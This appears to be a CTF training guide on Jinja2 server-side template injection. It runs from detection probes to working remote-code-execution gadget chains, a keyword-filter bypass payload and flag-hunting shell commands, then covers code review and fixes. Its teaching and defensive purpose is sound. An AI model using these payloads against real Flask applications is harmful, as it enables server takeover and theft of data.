# Masterclass: Server-Side Template Injection (Jinja2), From `{{7*7}}` to Root, From Zero

A from-nothing guide to the bug behind MOONLIGHT CLUB, PLAYER ONE and CITRUS STUDIO. By the end you'll know what a template engine is, exactly why injecting into one gives code execution, how to walk from a harmless-looking `49` to a root shell, how to beat a keyword filter, and how to spot and kill this in real code.

## How to read this

Read top to bottom the first time. Each part builds the next:

- **PART 0**, what a template engine even is (the mental model everything rests on).
- **PART 1**, the one idea: *data in the template vs. data as the template.*
- **PART 2**, the detection ladder and engine fingerprinting.
- **PART 3**, the exploitation chain, gadget by gadget, with *why* each step works.
- **PART 4**, beating filters (the CITRUS STUDIO problem).
- **PART 5**, finding it in the wild (code review + black box).
- **PART 6**, fixing it for good.
- Glossary + where to go next.

---

# PART 0, The Building Blocks

**A template** is a document with holes in it. You write the fixed parts once and leave placeholders for the variable parts:

```
Welcome, player {{ name }}
```

**A template engine** is the program that fills the holes. You hand it the template *and* a bag of values (`{name: "Olwen"}`) and it returns `Welcome, player Olwen`. Flask ships with **Jinja2**. Django, Nunjucks, Twig, Freemarker, Thymeleaf, ERB, Handlebars, every framework has one.

The crucial detail: a template engine is not a string formatter. It is a **small programming language**. Inside `{{ ... }}` you can do arithmetic, call methods, index objects, loop. The engine *compiles* the template to code and *runs* it. That power is the whole point, and the whole danger.

Two phases, and this is the thing to burn into memory:

1. **Compile**, the engine reads the template *text* and turns the `{{ }}` parts into executable instructions.
2. **Render**, it runs those instructions with your data to produce output.

So there are two completely different places a user's input can land:

- **As data**, passed into the render step as a value. It's just text. Safe. `{{ name }}` with `name="{{7*7}}"` prints the literal `{{7*7}}`.
- **As template**, concatenated into the template *text* before the compile step. Now the user's `{{7*7}}` is *compiled* and *run*. It prints `49`. **That is the bug.**

---

# PART 1, The One Idea

> **SSTI happens when user input becomes part of the template source instead of the template's data.**

The vulnerable pattern, in Flask, is almost always one of these:

```python
from flask import render_template_string, request

name = request.form["name"]
return render_template_string("Welcome, player " + name)   # ← input IS the template
# or, just as bad:
return render_template_string(f"Welcome, player {name}")   # ← f-string splices it in first
```

Both build the template *string* out of user input and *then* hand it to Jinja. Jinja cannot tell "the trusted part" from "the attacker part", it's all one string to compile. So `name = "{{7*7}}"` makes the template `Welcome, player {{7*7}}`, which compiles and renders to `Welcome, player 49`.

Compare the safe version, which keeps the two worlds separate:

```python
return render_template_string("Welcome, player {{ name }}", name=name)
```

Here the template text is a fixed literal the developer wrote. `name` is passed as *data*. Jinja renders `{{ name }}` by substituting the value as text (and HTML-escaping it). `{{7*7}}` stays `{{7*7}}`. No injection.

Everything else in this guide is mechanics. **This is the idea.**

---

# PART 2, Detection & Fingerprinting

## 2.1 The universal probe

Send a tiny expression that produces a *different, unmistakable* value when evaluated:

```
{{7*7}}   → 49     (Jinja2, Twig, Nunjucks — "double brace" family)
${7*7}    → 49     (Freemarker, some JSP/EL)
#{7*7}    → 49     (Thymeleaf, Ruby string interpolation)
<%= 7*7 %>→ 49     (ERB, EJS)
```

Reflected `49` = injection. Reflected `{{7*7}}` literally = not this engine (try the next syntax, or it's just reflection/XSS, not SSTI).

> Make the math **non-trivial**: `{{7*7}}` not `{{1+1}}`. `49` is obviously "computed"; `2` could be coincidence.

## 2.2 Narrowing the engine

If `{{7*7}}` works, you're in the brace family. Distinguish Jinja2 from Twig/Nunjucks:

```
{{7*'7'}}       Jinja2 → 7777777   (Python string * int) ; Twig → 49
{{ self }}      Jinja2 → <TemplateReference ...>
{{ config }}    Jinja2/Flask → the Flask config object
```

In this CTF, `{{ config }}` returned a Flask `Config` object and `{{ self }}` returned a `TemplateReference`, unambiguously **Jinja2 on Flask**.

## 2.3 Reflection ≠ SSTI

A page that echoes `<b>hi</b>` raw is reflected **XSS** (client-side). A page that turns `{{7*7}}` into `49` is **SSTI** (server-side). FAN SIGNAL (8220) in this same event reflected input raw but left `{{7*7}}` untouched, XSS, not SSTI. Always run the math probe to tell them apart.

---

# PART 3, From `49` to a Shell

`49` proves you can evaluate expressions. Now you climb from the template sandbox into the Python runtime and then into the OS. The climb is just **attribute hops through objects you're already handed.**

## 3.1 The mental model of the climb

Python objects leak their whole world through dunder (`__double_underscore__`) attributes:

- every object → `__class__` → its type
- a type → `__mro__` or `__bases__` → parent types, up to `object`
- `object.__subclasses__()` → *every class loaded in the process* (often includes `subprocess.Popen`, file openers, etc.)
- any function → `__globals__` → the module-level globals of where it was defined (often includes `os`, `sys`, `subprocess` if that module imported them)

Jinja hands you several live objects in the template context: `lipsum`, `cycler`, `joiner`, `namespace`, `request`, `config`, `self`. Each is a doorway.

## 3.2 Enumerate, don't guess

The internet's favourite payload is `cycler.__init__.__globals__.os....`. **It failed in this CTF** because `os` wasn't in `cycler`'s module globals. Don't cargo-cult. First ask what's in scope:

```
{{ self._TemplateReference__context.keys() }}
→ dict_keys(['range','dict','lipsum','cycler','joiner','namespace',
             'url_for','get_flashed_messages','config','request','session','g'])
```

Now pick a global that *is* a function so it has useful `__globals__`. `lipsum` (Jinja's lorem-ipsum generator, defined in `jinja2.utils`, which imports `os`) is the reliable one:

```
{{ lipsum.__globals__['os'].popen('id').read() }}
→ uid=0(root) gid=0(root) groups=0(root)
```

Dissect it:

- `lipsum.__globals__` → the `jinja2.utils` module globals dict
- `['os']` → the `os` module (because that module did `import os`)
- `.popen('id')` → spawn a shell command, returns a file-like object
- `.read()` → read its stdout back into the page

That is arbitrary command execution. Everything after is `cat`.

## 3.3 Other reliable gadgets (keep a few, engines differ)

```jinja
{# via config, no globals needed for some reads #}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

{# the subclasses walk — when lipsum/cycler are stripped #}
{{ ''.__class__.__mro__[1].__subclasses__() }}   {# find an index for Popen, then: #}
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}

{# request is almost always present on Flask #}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## 3.4 Finding the flag once you have RCE

Treat it like a shell. Spray the usual spots and grep broadly:

```bash
ls -la / /app;
cat /flag* /app/flag* /app/app/flag.txt 2>/dev/null;
grep -rl safctf / 2>/dev/null | head;
find / -maxdepth 4 -iname '*flag*' 2>/dev/null;
env            # flags sometimes live in environment variables
```

In this CTF the flags were plain files: `/app/flag`, `/app/app/flag.txt`, `/app/templates/flag.txt`.

---

# PART 4, Beating a Filter (the CITRUS STUDIO problem)

CITRUS STUDIO evaluated `{{7*7}}` but answered *"Invalid input detected!"* to the real payload. That's a **blocklist**. Blocklists lose because a template language has infinitely many ways to spell the same thing.

## 4.1 Fingerprint the blocklist first

Send one suspicious token at a time and watch for the block banner vs. a normal render. In this CTF the blocked set was exactly:

- `__` (any double underscore)
- `config`
- the literal `os`

Allowed: `attr`, `|` filters, single `_`, string literals, `+` concatenation.

## 4.2 The three universal bypass tools

1. **Build forbidden strings at runtime** so the literal never appears in your input:
   - `__globals__` → `'_' + '_globals_' + '_'`
   - `os` → `'o' + 's'`
   - `__class__` → `'__'~'class'~'__'` (Jinja `~` is string concat), but if `__` is blocked, split it: `'_'+'_class_'+'_'`
2. **Use `|attr()` instead of the dot** to dodge filters that key on `.` + a bad name:
   - `obj.__globals__` → `obj|attr('_'+'_globals_'+'_')`
3. **Use subscripts instead of attribute access**: `obj['o'+'s']` where a `.os` would be caught.

Put together, the CITRUS STUDIO payload was:

```jinja
{{ (lipsum|attr('_'+'_globals_'+'_'))['o'+'s'].popen('cat /app/templates/flag.txt').read() }}
```

Not a single blocked substring survives, yet it's semantically identical to the clean payload.

## 4.3 More tricks for nastier filters

- **Hex/unicode in strings**: `'\x5f\x5f'` for `__`.
- **`request.args`/`request.values` indirection**: stash the bad word in a query param and read it back: `{{ ()|attr(request.args.a) }}&a=__class__`.
- **`|attr` chains** to avoid dots entirely; **`.get()`/`.pop()`** on dicts to avoid `[]` if brackets are filtered.
- **Case tricks only help if the filter is case-sensitive**, test it (CITRUS's was case-sensitive on `os`; some are not).

The meta-lesson: a blocklist is a puzzle, not a wall.

---

# PART 5, Identifying This in the Wild

## 5.1 Code review (the fast path)

Grep for the engine eating a built string:

```bash
# Python / Flask
grep -rnE 'render_template_string|Template\(' .        # look for a non-literal argument
grep -rnE 'render_template_string\((f?".*\{|.*\+ )' .  # f-string or concatenation = smell

# Others
#  Twig:       $twig->createTemplate($userInput)
#  Nunjucks:   nunjucks.renderString(userInput)
#  Freemarker: new Template("x", userInput, cfg)
#  Thymeleaf:  SpringEL in a name/expression attribute from user input
```

The red flag is always the same shape: **user data reaches the *first* argument of a render-string / create-template call.** If the template is a fixed literal and user data is a later keyword/variable, it's fine.

## 5.2 Black box

- Any field that produces *personalized* output, greetings, names, email previews, PDF/invoice generators, "subject" lines, filename templates, error messages that echo input.
- Run `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`. One of them doing math is SSTI.
- Watch for it in **non-obvious sinks**: wiki/markdown renderers, notification templates, "custom report" builders, admin "email template" editors.

## 5.3 Severity

SSTI is usually **RCE** and should be treated as critical. Even "blind" SSTI (no output) is exploitable via time delays, out-of-band DNS/HTTP, or error oracles. A sandboxed engine *reduces* impact to info-disclosure/DoS but sandboxes (Jinja's `SandboxedEnvironment`) have had escapes, don't rely on them as the only control.

---

# PART 6, The Fixes

1. **Never render user input as a template.** Pass it as data:
   ```python
   render_template("page.html", name=name)                 # best
   render_template_string("Hi {{ name }}", name=name)       # acceptable
   ```
2. **If users must supply templates** (a real product need), use a **sandboxed engine** *and* a strict allowlist of attributes/filters, run it in a **separate low-privilege process/container**, with no `os`/`subprocess` importable, seccomp, and network egress blocked. Treat the sandbox as defense-in-depth, not the only line.
3. **Don't ship with `DEBUG=True`.** Both 8020's config dump showed debug on, that alone can hand out a Werkzeug console/PIN RCE independent of SSTI.
4. **Blocklists are not a control.** If you find yourself filtering `__` or `os`, stop, the design is wrong. Fix the sink.
5. **Least privilege.** These apps ran as **root** in the container. Even with RCE, running as an unprivileged user and a read-only FS limits the blast radius.

---

# Glossary

- **Template engine**, program that fills placeholders in a document; really a small language.
- **SSTI**, Server-Side Template Injection; user input compiled/run as template code.
- **Gadget**, a chain of attribute/method accesses that pivots from a handed object to a dangerous capability (RCE).
- **Dunder**, a `__name__` attribute; Python's reflection surface (`__class__`, `__globals__`, `__subclasses__`).
- **`lipsum` / `cycler`**, Jinja2 globals usable as pivots into module globals.
- **Blocklist / allowlist**, deny-known-bad vs. permit-known-good; the first is routinely bypassed.
- **Sandboxed environment**, Jinja's restricted mode (`SandboxedEnvironment`); reduces but doesn't eliminate risk.

# Where to Go Next

- Build the vulnerable app yourself: a Flask route doing `render_template_string("Hi " + request.args['n'])`, pop `{{7*7}}`, then `lipsum.__globals__['os']`. Then fix it with `{{ name }}` + a variable and watch the exploit die.
- Practice the subclasses walk (`''.__class__.__mro__[1].__subclasses__()`) for when globals are stripped.
- Related in this dojo: **poleposition-sqli** and **dailyscoop-postgres-sqli** (injection into SQL), **echo-companion** / **deepblue-llm** (injection into an LLM prompt). Same disease, *input crossing from data into code/instructions*, different interpreter.
